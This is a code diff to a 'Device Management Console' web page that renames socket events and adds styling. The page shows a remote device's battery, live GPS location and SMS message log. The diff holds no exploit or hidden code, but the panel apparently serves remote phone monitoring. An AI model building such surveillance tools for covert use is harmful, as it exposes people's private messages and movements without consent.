@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+    <!DOCTYPE html>
 <html>
 <head>
     <title>Device Management Console</title>
@@ -9,7 +9,17 @@
     <style>
         /* NORMAL PROFESSIONAL FONT */
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; background: #f4f7f6; color: #333; }
-        
+        #smsSearch { 
+    width: 100%; 
+    padding: 12px; 
+    margin-bottom: 20px; 
+    border: 1px solid #ddd; 
+    border-radius: 6px; 
+    font-size: 1rem; 
+    box-sizing: border-box; 
+    outline: none;
+    color: #333;
+}
         /* SIDEBAR */
         .sidebar { width: 250px; background: #2c3e50; color: white; height: 100vh; position: fixed; }
         .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #34495e; transition: 0.3s; }
@@ -135,25 +145,25 @@ td {
         if(id === 'sms') socket.emit('get-sms-request');
     }
 
-    socket.on('ui-battery', (data) => {
+    socket.on('battery-status', (data) => { // Changed from ui-battery to match service
         document.getElementById('pct').innerText = data.percent;
         document.getElementById('status-dot').style.color = "green";
-        document.getElementById('status-dot').innerText = "●";
         document.getElementById('bolt').style.display = data.charging ? "block" : "none";
     });
 
-    socket.on('ui-gps-display', (data) => {
+    socket.on('gps-update', (data) => {
         document.getElementById('gps-addr').innerText = data.address;
         document.getElementById('gps-acc').innerText = data.accuracy;
         document.getElementById('gps-time').innerText = data.time;
-        if(map && data.lat) {
+        
+        if(map && data.lat && data.lng) {
             const pos = [data.lat, data.lng];
             map.setView(pos, 16);
             marker.setLatLng(pos);
         }
     });
 
-    socket.on('ui-sms-display', (data) => {
+  socket.on('sms-data-log', (data) => { // Changed from ui-sms-display to match service
         allSMS = data;
         renderSMS(allSMS);
     });
@@ -181,5 +191,6 @@ td {
 </script>
 </body>
 </html>
+
 
 
